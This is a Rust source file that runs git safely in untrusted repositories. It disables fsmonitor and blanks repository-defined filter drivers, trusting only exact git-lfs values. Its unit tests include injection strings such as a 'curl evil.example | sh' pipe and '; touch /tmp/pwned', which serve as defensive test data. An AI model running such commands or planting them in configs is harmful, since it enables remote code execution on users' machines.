use std::{
    io::Write,
    path::Path,
    process::{Command, Stdio},
};

use crate::Error;

/// Runs `git` in `dir` and returns stdout. Exit code 0 is success.
///
/// Never prompts for input, and never takes the index lock, so a background
/// refresh cannot make the user's own `git commit` fail.
///
/// A repository's own config is untrusted: opening a directory that came with its
/// `.git` must not run code it chose. Two defences apply to every call:
/// - `core.fsmonitor` is forced off, because it names a command `git status` runs.
/// - Filter drivers (`filter.<name>.clean/smudge/process`) defined in the repo's own
///   config are blanked, because git runs them whenever it compares or stages a
///   file. Filters from the user's global or system config are left alone, as are
///   `git-lfs` ones, so legitimate setups keep working.
///
/// Diff callers also pass `--no-ext-diff` and `--no-textconv`. Hooks are left alone so
/// they still run for commits, as they would in a terminal.
pub(crate) fn run_git(dir: &Path, args: &[&str]) -> Result<Vec<u8>, Error> {
    run_git_allowing(dir, args, &[0])
}

/// Like `run_git`, but also treats the listed exit codes as success. `git diff
/// --no-index` exits 1 when the files differ, which is the normal case.
pub(crate) fn run_git_allowing(
    dir: &Path,
    args: &[&str],
    success_codes: &[i32],
) -> Result<Vec<u8>, Error> {
    run(dir, args, None, success_codes)
}

/// Runs `git` with `input` on stdin, e.g. `git commit -F -` so a message never
/// touches the command line or a temp file.
pub(crate) fn run_git_with_input(
    dir: &Path,
    args: &[&str],
    input: &[u8],
) -> Result<Vec<u8>, Error> {
    run(dir, args, Some(input), &[0])
}

fn run(
    dir: &Path,
    args: &[&str],
    input: Option<&[u8]>,
    success_codes: &[i32],
) -> Result<Vec<u8>, Error> {
    // Fail closed: if we can't tell which filters the repo configured, run nothing.
    let overrides = untrusted_filter_overrides(dir)?;
    exec(dir, &overrides, args, input, success_codes)
}

/// `-c filter.<name>.<command>=` arguments that disable filters the repo configured.
fn untrusted_filter_overrides(dir: &Path) -> Result<Vec<String>, Error> {
    // Reading config runs nothing, so this call itself needs no overrides. Exit code 1
    // just means no filters are configured.
    let output = exec(
        dir,
        &[],
        &["config", "-z", "--show-scope", "--get-regexp", r"^filter\."],
        None,
        &[0, 1],
    )?;
    Ok(blank_untrusted_filters(&String::from_utf8_lossy(&output)))
}

/// Parses `git config -z --show-scope --get-regexp` output, which is a series of
/// `scope NUL key NEWLINE value NUL` records. A value may itself contain newlines,
/// so it can't be mistaken for another entry.
fn blank_untrusted_filters(config: &str) -> Vec<String> {
    let mut overrides = Vec::new();
    let mut fields = config.split('\0');
    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
        if !matches!(scope, "local" | "worktree") {
            continue;
        }
        let (key, value) = entry.split_once('\n').unwrap_or((entry, ""));
        let Some((driver, command)) = key
            .strip_prefix("filter.")
            .and_then(|rest| rest.rsplit_once('.'))
        else {
            continue;
        };
        if !matches!(command, "clean" | "smudge" | "process")
            || is_canonical_lfs(driver, command, value)
        {
            continue;
        }
        overrides.push("-c".to_owned());
        overrides.push(format!("filter.{driver}.{command}="));
    }
    overrides
}

/// Git LFS is the one common filter installed per repository, and blanking it would
/// make every large file look modified. Only the driver named `lfs` with exactly the
/// values `git lfs install` writes is trusted: git runs these strings through a shell,
/// so anything looser (a prefix match, extra arguments) could smuggle in a command.
fn is_canonical_lfs(driver: &str, command: &str, value: &str) -> bool {
    driver == "lfs"
        && matches!(
            (command, value),
            ("clean", "git-lfs clean -- %f")
                | ("smudge", "git-lfs smudge -- %f")
                | ("smudge", "git-lfs smudge --skip -- %f")
                | ("process", "git-lfs filter-process")
                | ("process", "git-lfs filter-process --skip")
        )
}

fn exec(
    dir: &Path,
    overrides: &[String],
    args: &[&str],
    input: Option<&[u8]>,
    success_codes: &[i32],
) -> Result<Vec<u8>, Error> {
    let mut child = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(["-c", "core.fsmonitor=false"])
        .args(overrides)
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_OPTIONAL_LOCKS", "0")
        // A file named `a[1].txt` must mean that file, not a glob.
        .env("GIT_LITERAL_PATHSPECS", "1")
        .stdin(if input.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    if let (Some(input), Some(mut stdin)) = (input, child.stdin.take()) {
        // Dropping `stdin` at the end of the block closes the pipe so git sees EOF.
        stdin.write_all(input)?;
    }
    let output = child.wait_with_output()?;

    if output
        .status
        .code()
        .is_some_and(|code| success_codes.contains(&code))
    {
        Ok(output.stdout)
    } else {
        Err(Error::Git {
            command: args.first().copied().unwrap_or_default().to_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).trim().to_owned(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Builds `git config -z --show-scope` output.
    fn config(entries: &[(&str, &str, &str)]) -> String {
        entries
            .iter()
            .map(|(scope, key, value)| format!("{scope}\0{key}\n{value}\0"))
            .collect()
    }

    #[test]
    fn blanks_repo_scoped_filters_only() {
        let output = config(&[
            ("local", "filter.evil.clean", "/tmp/evil.sh"),
            ("global", "filter.mine.clean", "my-clean"),
            ("worktree", "filter.wt.smudge", "/tmp/wt.sh"),
            ("system", "filter.sys.process", "sys-filter"),
        ]);
        assert_eq!(
            blank_untrusted_filters(&output),
            ["-c", "filter.evil.clean=", "-c", "filter.wt.smudge="]
        );
    }

    #[test]
    fn keeps_exactly_the_canonical_lfs_filters() {
        let output = config(&[
            ("local", "filter.lfs.clean", "git-lfs clean -- %f"),
            ("local", "filter.lfs.smudge", "git-lfs smudge -- %f"),
            ("local", "filter.lfs.process", "git-lfs filter-process"),
            ("local", "filter.lfs.required", "true"),
        ]);
        assert!(blank_untrusted_filters(&output).is_empty());
    }

    #[test]
    fn an_lfs_lookalike_that_adds_a_command_is_blanked() {
        // Git runs these through a shell, so a trailing `; ...` would execute.
        for value in [
            "git-lfs clean -- %f; touch /tmp/pwned",
            "git-lfs clean -- %f && curl evil.example | sh",
            "git-lfs clean -- %f\ntouch /tmp/pwned",
            "git-lfs clean -- %f ",
            "git-lfs clean",
            "git-lfs-evil clean -- %f",
        ] {
            let output = config(&[("local", "filter.lfs.clean", value)]);
            assert_eq!(
                blank_untrusted_filters(&output),
                ["-c", "filter.lfs.clean="],
                "{value:?} was trusted"
            );
        }
    }

    #[test]
    fn the_lfs_command_is_only_trusted_on_the_driver_named_lfs() {
        let output = config(&[("local", "filter.other.clean", "git-lfs clean -- %f")]);
        assert_eq!(
            blank_untrusted_filters(&output),
            ["-c", "filter.other.clean="]
        );
    }

    #[test]
    fn a_value_cannot_forge_another_entry() {
        // The multi-line value contains text that looks like a global (trusted) entry.
        let output = config(&[(
            "local",
            "filter.evil.clean",
            "x\nglobal\0filter.evil.clean\nsafe",
        )]);
        assert_eq!(
            blank_untrusted_filters(&output),
            ["-c", "filter.evil.clean="]
        );
    }

    #[test]
    fn only_clean_smudge_and_process_are_blanked() {
        let output = config(&[
            ("local", "filter.x.required", "true"),
            ("local", "filter.x.clean", "run-me"),
        ]);
        assert_eq!(blank_untrusted_filters(&output), ["-c", "filter.x.clean="]);
    }

    #[test]
    fn driver_names_containing_dots_are_handled() {
        let output = config(&[("local", "filter.my.driver.clean", "run-me")]);
        assert_eq!(
            blank_untrusted_filters(&output),
            ["-c", "filter.my.driver.clean="]
        );
    }

    #[test]
    fn empty_and_malformed_output_blanks_nothing() {
        assert!(blank_untrusted_filters("").is_empty());
        assert!(blank_untrusted_filters("local").is_empty());
        assert!(blank_untrusted_filters("local\0not-a-filter\nx\0").is_empty());
    }
}
